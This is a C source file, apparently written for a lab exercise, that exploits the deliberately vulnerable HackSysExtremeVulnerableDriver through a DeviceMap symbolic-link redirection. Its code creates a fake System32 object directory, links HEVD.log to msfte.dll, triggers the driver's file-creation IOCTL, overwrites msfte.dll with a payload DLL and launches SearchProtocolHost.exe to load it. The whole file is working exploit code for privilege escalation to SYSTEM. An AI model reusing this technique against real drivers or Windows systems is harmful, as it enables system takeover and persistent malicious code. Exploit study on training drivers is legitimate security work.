#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <profileapi.h>
#define OBJ_CASE_INSENSITIVE   0x00000040
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
typedef NTSTATUS(WINAPI* NtCreateDirectoryObject_t)(OUT PHANDLE           DirectoryHandle,
	IN ACCESS_MASK        DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS(WINAPI* NtOpenDirectoryObject_t)(OUT PHANDLE           DirectoryHandle,
	IN ACCESS_MASK        DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes);
NtCreateDirectoryObject_t  NtCreateDirectoryObject;
typedef VOID(WINAPI* RtlInitUnicodeString_t)(IN OUT PUNICODE_STRING DestinationString,
	IN PCWSTR              SourceString OPTIONAL);
#define InitializeObjectAttributes(i, o, a, r, s) {  \
                (i)->Length = sizeof(OBJECT_ATTRIBUTES); \
                (i)->RootDirectory = r;                  \
                (i)->Attributes = a;                     \
                (i)->ObjectName = o;                     \
                (i)->SecurityDescriptor = s;             \
                (i)->SecurityQualityOfService = NULL;    \
            }
RtlInitUnicodeString_t        RtlInitUnicodeString;
HANDLE hDriver;
typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation,
	ProcessQuotaLimits,
	ProcessIoCounters,
	ProcessVmCounters,
	ProcessTimes,
	ProcessBasePriority,
	ProcessRaisePriority,
	ProcessDebugPort,
	ProcessExceptionPort,
	ProcessAccessToken,
	ProcessLdtInformation,
	ProcessLdtSize,
	ProcessDefaultHardErrorMode,
	ProcessIoPortHandlers,
	ProcessPooledUsageAndLimits,
	ProcessWorkingSetWatch,
	ProcessUserModeIOPL,
	ProcessEnableAlignmentFaultFixup,
	ProcessPriorityClass,
	ProcessWx86Information,
	ProcessHandleCount,
	ProcessAffinityMask,
	ProcessPriorityBoost,
	ProcessDeviceMap,
	ProcessSessionInformation,
	ProcessForegroundInformation,
	ProcessWow64Information,
	ProcessImageFileName,
	ProcessLUIDDeviceMapsEnabled,
	ProcessBreakOnTermination,
	ProcessDebugObjectHandle,
	ProcessDebugFlags,
	ProcessHandleTracing,
	ProcessIoPriority,
	ProcessExecuteFlags,
	ProcessTlsInformation,
	ProcessCookie,
	ProcessImageInformation,
	ProcessCycleTime,
	ProcessPagePriority,
	ProcessInstrumentationCallback,
	ProcessThreadStackAllocation,
	ProcessWorkingSetWatchEx,
	ProcessImageFileNameWin32,
	ProcessImageFileMapping,
	ProcessAffinityUpdateMode,
	ProcessMemoryAllocationMode,
	ProcessGroupInformation,
	ProcessTokenVirtualizationEnabled,
	ProcessConsoleHostProcess,
	ProcessWindowInformation,
	MaxProcessInfoClass
} PROCESSINFOCLASS;
typedef  struct _PROCESS_DEVICEMAP_INFORMATION {
	HANDLE DirectoryHandle;
} PROCESS_DEVICEMAP_INFORMATION,*PPROCESS_DEVICEMAP_INFORMATION;
DWORD dw;
typedef NTSTATUS(WINAPI* NtCreateSymbolicLinkObject_t)(OUT PHANDLE           SymbolicLinkHandle,
	IN ACCESS_MASK        DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PUNICODE_STRING    TargetName);
NtCreateSymbolicLinkObject_t  NtCreateSymbolicLinkObject;
NtOpenDirectoryObject_t       NtOpenDirectoryObject;
typedef NTSTATUS(WINAPI* NtSetInformationProcess_t)(IN HANDLE           ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	IN PVOID            ProcessInformation,
	IN ULONG            ProcessInformationLength);
NtSetInformationProcess_t NtSetInformationProcess;

//设置进程的Device Map
NTSTATUS SetProcessDeviceMap(HANDLE DirectoryHandle) {
	
	PROCESS_DEVICEMAP_INFORMATION DeviceMap = { DirectoryHandle };

	int NtStatus=NtSetInformationProcess((HANDLE)0xFFFFFFFF,
		ProcessDeviceMap,
		&DeviceMap,
		sizeof(DeviceMap));

	if (NtStatus != 0) {
		printf("\t\t[-] Failed to set per-process DeviceMap: 0x%X\n", NtStatus);
		exit(EXIT_FAILURE);
	}
	return 0;
}
HANDLE hFile = NULL;
ULONG BytesReturned;
HANDLE hTempObject = NULL;
HANDLE hGlobalRootObject = NULL;
HANDLE hPerProcessRootObject = NULL;
HANDLE CreateObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName) {
	HANDLE DirectoryHandle = NULL;
	UNICODE_STRING ObjectName = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	PUNICODE_STRING pUnicodeObjectName = NULL;

	if (DirectoryName) {
		RtlInitUnicodeString(&ObjectName, DirectoryName);
		pUnicodeObjectName = &ObjectName;
	}

	InitializeObjectAttributes(&ObjectAttributes,
		pUnicodeObjectName,
		OBJ_CASE_INSENSITIVE,
		hRoot,
		0);

	int NtStatus=NtCreateDirectoryObject(&DirectoryHandle, DIRECTORY_ALL_ACCESS, &ObjectAttributes);

	 if (NtStatus != 0) {
		 printf("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
		 getchar();
	 }
	return DirectoryHandle;
}
HANDLE CreateSymlink(HANDLE hRoot, LPCWSTR SymbolicLinkName, LPCWSTR TargetName) {
	HANDLE SymbolicLinkHandle = NULL;
	UNICODE_STRING TargetObjectName = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	UNICODE_STRING SymbolicLinkObjectName = { 0 };

	RtlInitUnicodeString(&SymbolicLinkObjectName, SymbolicLinkName);
	RtlInitUnicodeString(&TargetObjectName, TargetName);

	InitializeObjectAttributes(&ObjectAttributes,
		&SymbolicLinkObjectName,
		OBJ_CASE_INSENSITIVE,
		hRoot,
		NULL);

	int NtStatus = NtCreateSymbolicLinkObject(&SymbolicLinkHandle,
		SYMBOLIC_LINK_ALL_ACCESS,
		&ObjectAttributes,
		&TargetObjectName);

	if (NtStatus != 0) {
		printf("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
		getchar();
	}
	return SymbolicLinkHandle;
}
HANDLE OpenObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName) {
	HANDLE DirectoryHandle = NULL;
	UNICODE_STRING ObjectName = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };

	RtlInitUnicodeString(&ObjectName, DirectoryName);
	InitializeObjectAttributes(&ObjectAttributes, &ObjectName, OBJ_CASE_INSENSITIVE, hRoot, NULL);

	int NtStatus=NtOpenDirectoryObject(&DirectoryHandle, MAXIMUM_ALLOWED, &ObjectAttributes);
	if (NtStatus != 0) {
		printf("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
		getchar();
		exit(EXIT_FAILURE);
	}
	return DirectoryHandle;
}
VOID InitAPI() {
	LPCSTR nt = "ntdll";
	HMODULE hntdll = GetModuleHandleA(nt);
	NtSetInformationProcess = (NtSetInformationProcess_t)GetProcAddress(hntdll, "NtSetInformationProcess");
	NtCreateDirectoryObject = (NtCreateDirectoryObject_t)GetProcAddress(hntdll, "NtCreateDirectoryObject");
	RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(hntdll, "RtlInitUnicodeString");
	NtOpenDirectoryObject = (NtOpenDirectoryObject_t)GetProcAddress(hntdll, "NtOpenDirectoryObject");
	NtCreateSymbolicLinkObject = (NtCreateSymbolicLinkObject_t)GetProcAddress(hntdll, "NtCreateSymbolicLinkObject");
}
VOID WritePayloadDll(LPCTSTR szPath) {
	CHAR Buffer[4096] = { 0 };
	HANDLE TargetDllFileHandle = NULL;
	HANDLE SourceDllFileHandle = NULL;
	DWORD dwBytesRead, dwBytesWritten;
	LPCTSTR SourceDllFilePath = L"payload.dll";
	TargetDllFileHandle = CreateFile(szPath,
		GENERIC_ALL,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (TargetDllFileHandle == INVALID_HANDLE_VALUE) {
		printf("\t\t[-] Target file does not exist: %ws Error=%x\n", szPath, GetLastError());
		getchar();
		exit(EXIT_FAILURE);
	}

	SourceDllFileHandle = CreateFileW(SourceDllFilePath,
		GENERIC_ALL,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (SourceDllFileHandle == INVALID_HANDLE_VALUE) {
		printf("\t\t[-] Source payload DLL file does not exist: %ws Error=%x\n", SourceDllFilePath,GetLastError());
		getchar();
		exit(EXIT_FAILURE);
	}

	do {
		if (!ReadFile(SourceDllFileHandle, Buffer, sizeof(Buffer), &dwBytesRead, NULL)) {
			printf("\t\t[-] Unable to read file: %ws\n", SourceDllFilePath);
			getchar();
			break;
		}

		if (dwBytesRead == 0) {
			break;
		}

		if (!WriteFile(TargetDllFileHandle, Buffer, dwBytesRead, &dwBytesWritten, NULL)) {
			printf("\t\t[-] Unable to write file: %ws\n", szPath);
			getchar();
			break;
		}
	} while (TRUE);

	CloseHandle(SourceDllFileHandle);
	CloseHandle(TargetDllFileHandle);
}

VOID LaunchWMIProcess() {
    STARTUPINFOW StartupInformation;
    PROCESS_INFORMATION ProcessInformation;

    ZeroMemory(&StartupInformation, sizeof(StartupInformation));
    StartupInformation.cb = sizeof(StartupInformation);

    ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

	if (CreateProcessW(L"C:\\Windows\\System32\\SearchProtocolHost.exe",
		(LPWSTR)L"USERPROFILE",
                       NULL,
                       NULL,
                       FALSE,
                       CREATE_NO_WINDOW,
                       NULL,
                       NULL,
                       &StartupInformation,
                       &ProcessInformation)) {
        WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
        CloseHandle(ProcessInformation.hProcess);
        CloseHandle(ProcessInformation.hThread);
    }
}
int main() {
		hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE) {
			printf("[!] Unable to get a handle on the device\n");
			getchar();
			return -1;
		}
		//获得nt函数地址
		InitAPI();
		//创建根目录对象
		hPerProcessRootObject = CreateObjectDirectory(NULL, NULL);
		//创建目录对象为C:\\Windows\\System32
		hTempObject = CreateObjectDirectory(hPerProcessRootObject, L"C:");
		hTempObject = CreateObjectDirectory(hTempObject, L"Windows");
		hTempObject = CreateObjectDirectory(hTempObject, L"System32");
		//创建符号链接
		hTempObject = CreateSymlink(hTempObject, L"HEVD.log", L"\\GLOBAL??\\C:\\Windows\\System32\\msfte.dll");
		//修改进程的DeviceMap 
		SetProcessDeviceMap(hPerProcessRootObject);
		//此时内核调用ZWCreateFile 打开的其实就是刚刚跟创建好的符号链接 
		DeviceIoControl(hDriver, 0x22203B, 0, 0, 0, 0, &dw, NULL);
		//还原进程的DeviceMap
		hGlobalRootObject = OpenObjectDirectory(NULL, L"\\GLOBAL??");
		SetProcessDeviceMap(hGlobalRootObject);
		//将shellcode写入
		WritePayloadDll(L"C:\\Windows\\System32\\msfte.dll");
		//启动SearchProtocolHost.exe
		LaunchWMIProcess();	
		return 0;
}
